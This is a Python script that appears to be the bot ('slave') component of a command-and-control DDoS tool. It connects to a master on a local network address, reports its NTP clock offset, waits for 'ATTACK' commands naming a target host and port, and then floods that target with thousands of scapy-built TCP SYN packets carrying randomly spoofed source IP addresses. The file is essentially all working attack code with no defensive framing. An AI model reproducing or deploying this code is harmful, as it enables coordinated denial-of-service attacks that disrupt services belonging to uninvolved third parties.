#!/usr/bin/env python3

import time
import os
import sys
import string
import ntplib
import random
import socket
import scapy.all as scapy

## Setting up variables
SERVER_HOST = '192.168.0.113'  # Updated IP address
SERVER_PORT = 8080
MS_LISTEN_HOST = '192.168.0.20'  # Updated IP address
MS_LISTEN_PORT = 8081

class Slave:
    def __init__(self, host, port):
        print("DDoS mode loaded")
        self.host = host
        self.port = port
        self.message = 'asdf'
        conn = int(input("How many connections do you want to make: "))
        ip = socket.gethostbyname(self.host)
        self.num_connections = 0

        # Get NTP times
        ntpc = ntplib.NTPClient()
        ntp_res = ntpc.request(SERVER_HOST, version=3)

        # Connect to master
        self.masterHost = MS_LISTEN_HOST
        self.masterPort = MS_LISTEN_PORT
        self.sockMaster = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sockMaster.connect((self.masterHost, self.masterPort))
        self.sockMaster.send(f'Slave offset is: {ntp_res.offset}'.encode('utf-8'))

    def acceptMessages(self):
        while True:
            msg_buf = self.sockMaster.recv(64)
            if len(msg_buf) > 0:
                print(msg_buf.decode('utf-8'))
                if msg_buf.decode('utf-8').startswith('ATTACK'):
                    command, host, port, offset = msg_buf.decode('utf-8').split()
                    self.doTheDos(host, int(port), float(offset))

    def doTheDos(self, host, port, offset):
        for _ in range(6000):
            self.dos(host, port)

    def dos(self, host, port):
        try:
            source = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
            spoofed_SYN = scapy.IP(dst=host, src=source) / scapy.TCP(dport=port, flags='S') / "HELLO"
            print(spoofed_SYN.summary())
            scapy.send(spoofed_SYN)
        except Exception as e:
            print(f"Error: {e}")
            self.num_connections += 1
            print(f"|[Connection Failed] | {self.num_connections}")
        print("|[DDoS Attack Engaged] |")

if __name__ == '__main__':
    slaveNode = Slave('localhost', 8080)
    slaveNode.acceptMessages()
